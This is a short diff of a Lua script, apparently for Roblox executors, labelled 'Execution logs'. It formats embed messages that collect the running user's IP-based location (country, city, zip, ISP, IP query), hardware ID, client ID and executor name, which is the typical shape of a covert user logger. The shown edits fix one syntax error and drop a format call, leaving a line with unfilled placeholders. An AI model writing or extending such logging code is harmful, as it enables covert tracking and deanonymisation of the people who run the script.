@@ -70,14 +70,14 @@ do -- // Execution logs
         };
         {
             name = "Game Info:";
-            value = ("```ini\n[+] [PLACE] - [%s]\n[+] [PLACE-ID] - [%s]\n[+] [JOBID] - [%s]\n```"):format("test", tostring(PlaceID));
+            value = ("```ini\n[+] [PLACE] - [%s]\n[+] [PLACE-ID] - [%s]\n[+] [JOBID] - [%s]\n```");
         };
         {
             name = "Location Info:";
             value = ("```ini\n[+] [COUNTRY] - [%s] | [%s]\n[+] [QUERY] - [%s]\n\n-- // ADDITIONAL INFO \n[+] [CITY] - [%s] | [%s]\n[+] [TIMEZONE] - [%s]\n[+] [ISP] - [%s]\n```"):format(Country, CountryCode, Query, City, Zip, Timezone, ISP)
         };
         {
-            name "Executor Info:";
+            name = "Executor Info:";
             value = ("```ini\n[+] [EXECUTOR] - [%s]\n[+] [HWID] - [%s]\n[+] [CLIENT-ID] - [%s]\n```"):format(identifyexecutor(), HardwareID, ClientID);
         };
         {
